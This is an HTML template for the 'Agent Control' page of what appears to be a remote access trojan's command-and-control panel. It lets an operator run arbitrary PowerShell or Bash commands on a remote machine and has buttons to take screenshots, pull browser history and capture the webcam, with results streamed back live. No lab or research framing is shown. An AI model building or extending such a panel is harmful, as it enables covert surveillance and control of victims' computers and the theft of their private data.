<!DOCTYPE html>
<html>
<head>
    <title>Agent Control</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        .console-output { background: #1e1e1e; color: #d4d4d4; height: 60vh; overflow-y: auto; }
        pre { white-space: pre-wrap; background: #2d2d2d; padding: 10px; border-radius: 5px; }
        .info-card { background: #2d2d2d; border-radius: 5px; padding: 15px; margin-bottom: 15px; }
        .auto-refresh { color: #28a745; font-size: 0.9em; margin-left: 10px; }
        .shell-input { font-family: 'Courier New', monospace; }
        .os-indicator { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); }
    </style>
</head>
<body class="bg-dark text-light">
    <div class="container py-4">
        <div class="d-flex justify-content-between mb-4">
            <div>
                <h1>Agent: {{ agent_id }}</h1>
                <small class="text-muted">Last seen: {{ agent.last_seen }}</small>
            </div>
            <div>
                <a href="/dashboard" class="btn btn-outline-light">‚Üê Dashboard</a>
                <button class="btn btn-link text-success" id="autoRefreshToggle">Auto Refresh: ON</button>
            </div>
        </div>

        <div class="row g-4">
            <div class="col-md-4">
                <div class="info-card">
                    <h5>üñ•Ô∏è System Information</h5>
                    <pre id="sysinfoOutput">{{ sysinfo }}</pre>
                </div>
                <div class="info-card">
                    <h5>üåç Network Information</h5>
                    <pre id="ipOutput">{{ ip_info }}</pre>
                </div>
                
                <div class="card command-card bg-secondary mt-3">
                    <div class="card-header bg-primary d-flex align-items-center">
                        <span>Command Execution</span>
                        <span class="os-indicator badge bg-info">
                            {% if agent.os == 'Windows' %}
                            ü™ü Windows
                            {% else %}
                            üêß Linux
                            {% endif %}
                        </span>
                    </div>
                    <div class="card-body">
                        <div class="input-group">
                            <input type="text" 
                                   id="commandInput" 
                                   class="form-control bg-dark text-light shell-input" 
                                   placeholder="Enter {% if agent.os == 'Windows' %}PowerShell{% else %}Bash{% endif %} command">
                            <button class="btn btn-primary" onclick="sendCustomCommand()">
                                Execute
                            </button>
                        </div>
                        <div class="mt-3 d-grid gap-2">
                            <button class="btn btn-warning" onclick="sendCommand('sysinfo')">Refresh System Info</button>
                            <button class="btn btn-primary" onclick="sendCommand('public_ip')">Refresh Public IP</button>
                            <button class="btn btn-success" onclick="sendCommand('screenshot')">Take Screenshot</button>
                            <button class="btn btn-info" onclick="sendCommand('browser_history')">Get Browser History</button>
                            <button class="btn btn-danger" onclick="sendCommand('webcam_capture')">Capture Webcam</button>
                        </div>
                    </div>
                </div>
            </div>

            <div class="col-md-8">
                <div class="card command-card bg-secondary">
                    <div class="card-header bg-primary d-flex justify-content-between align-items-center">
                        Command Results
                        <small class="auto-refresh" id="refreshStatus">Updating...</small>
                    </div>
                    <div class="card-body console-output" id="results">
                        {% for result in results %}
                        <div class="mb-3">
                            <div class="card bg-dark text-light">
                                <div class="card-header d-flex justify-content-between">
                                    <code>{{ result.command }}</code>
                                    <small class="text-muted">{{ result.timestamp }}</small>
                                </div>
                                <div class="card-body p-2">
                                    <pre>{{ result.output }}</pre>
                                </div>
                            </div>
                        </div>
                        {% endfor %}
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/socket.io-client@4.7.2/dist/socket.io.min.js"></script>
    <script>
        const socket = io();
        let autoRefreshInterval = null;
        let autoRefreshEnabled = true;

        // Socket.io handlers
        socket.on('command_result', (data) => {
            if (data.agent_id === '{{ agent_id }}') {
                updateDisplay(data.result);
            }
        });

        function updateDisplay(result) {
            const cmd = result.command.toLowerCase();
            const output = result.output;

            // Update specific info panels
            if (cmd === 'sysinfo') {
                document.getElementById('sysinfoOutput').textContent = output;
            } else if (cmd === 'public_ip') {
                document.getElementById('ipOutput').textContent = output;
            }
            
            // Add to results list
            const resultsDiv = document.getElementById('results');
            const resultHtml = `
                <div class="mb-3">
                    <div class="card bg-dark text-light">
                        <div class="card-header d-flex justify-content-between">
                            <code>${result.command}</code>
                            <small class="text-muted">${new Date(result.timestamp).toLocaleString()}</small>
                        </div>
                        <div class="card-body p-2">
                            <pre>${output}</pre>
                        </div>
                    </div>
                </div>
            `;
            resultsDiv.insertAdjacentHTML('afterbegin', resultHtml);
        }

        function sendCommand(command) {
            document.getElementById('commandInput').value = command;
            sendCustomCommand();
        }

        function sendCustomCommand() {
            const command = document.getElementById('commandInput').value.trim();
            if (!command) return;

            fetch('/send-command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    agent_id: '{{ agent_id }}',
                    command: command
                })
            }).then(() => {
                document.getElementById('commandInput').value = '';
                if (!autoRefreshEnabled) manualRefresh();
            });
        }

        // Auto-refresh toggle
        document.getElementById('autoRefreshToggle').addEventListener('click', () => {
            autoRefreshEnabled = !autoRefreshEnabled;
            document.getElementById('autoRefreshToggle').textContent = 
                `Auto Refresh: ${autoRefreshEnabled ? 'ON' : 'OFF'}`;
            document.getElementById('refreshStatus').textContent = 
                autoRefreshEnabled ? 'Updating...' : 'Manual Mode';
        });

        // Initial setup
        function setupAutoRefresh() {
            autoRefreshInterval = setInterval(() => {
                if (autoRefreshEnabled) {
                    socket.emit('request_update', { agent_id: '{{ agent_id }}' });
                }
            }, 2000);
        }

        setupAutoRefresh();
    </script>
</body>
</html>